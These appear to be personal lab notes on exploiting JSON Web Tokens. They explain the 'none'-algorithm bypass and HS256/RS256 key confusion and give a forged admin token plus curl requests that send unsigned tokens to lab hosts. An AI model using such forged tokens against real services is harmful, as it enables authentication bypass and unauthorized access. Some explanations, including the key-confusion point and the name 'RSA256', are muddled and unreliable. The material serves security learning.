# JWT Exploitation

# Notes
	1. JWT has three parts header,payload and signature.
	2. We need header to verify the signature and signature to verify the header.
	3. Header consist of algorithm and its type.
	4. Header,Payload is base64 URL Encoded. Now For signature part
		key='secretkey'
		unsignedtoken=base64(header).base64(payload)
		signature=HMAC-SHA256(key,unsignedtoken) // For HS256 Algorithm
		jwt=base64(header).base64(payload).base64(signature)

## Exploit Part
	1. What if we allow attacker to change the algorithm type?
		1. Lets try to change it to symmetric keys algorithm.
	2. What if he changes it to none algorithm since some jwt libraries don't verify the signature if none algorithm is used?
		1. Now a days secret key is provided, but if not, we don't need signature keys since we can use none-algorithm and no signature
			header={'algorithm':'none'} .payload={}.signature={} => Empty signature.
		2. If secret key is not there, create your own tokens.
	3. What if HS256 is used who uses symmetric keys to verify and sign tokens. I.E secretkey and public key is same?
		1. We would just require publicRSA key and we can create our own tokens using this key.
		2. Because HS256 uses only one secretkey to sign the jWT token and verify the token.

## Remediation
	1. Remediation is to use RSA256 since that is asymettric algorithm, which uses Private key to sign the token and public key to verify the token.
	2. Private key is with sendor only and public key is available to reciever.


## Forged JWT Token
	eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJsb2dpbiI6ICJhZG1pbiIsImlhdCI6ICIxNjY5MTAwOTAyIn0

## Curl Requests
	1. curl -X POST -H “Content-Type: application/json” -H “Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6MSwiaWF0IjoxNTczMzU4Mzk2fQ.” http://192.14.147.3:1337/users -d ‘{ “username”: “test”, “email”: “test@test.com”, “password”: “password”, “role”:”1" }’ | jq
	2. curl -X POST -H “Content-Type: application/json” -H “Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6ICJhZG1pbiIsImlhdCI6ICIxNjY5MTAwOTAyIn0.” http://ptl-37f7c8cb-ac948588.libcurl.so/login.php -d ‘{ “username”: “test1234”, “password”: “test”}’ | jq

## Resources
	1. https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
	2. https://auth0.com/blog/rs256-vs-hs256-whats-the-difference/
	3. https://medium.com/@phosmet/forging-jwt-exploiting-the-none-algorithm-a37d670af54f
	4. https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771
	5. 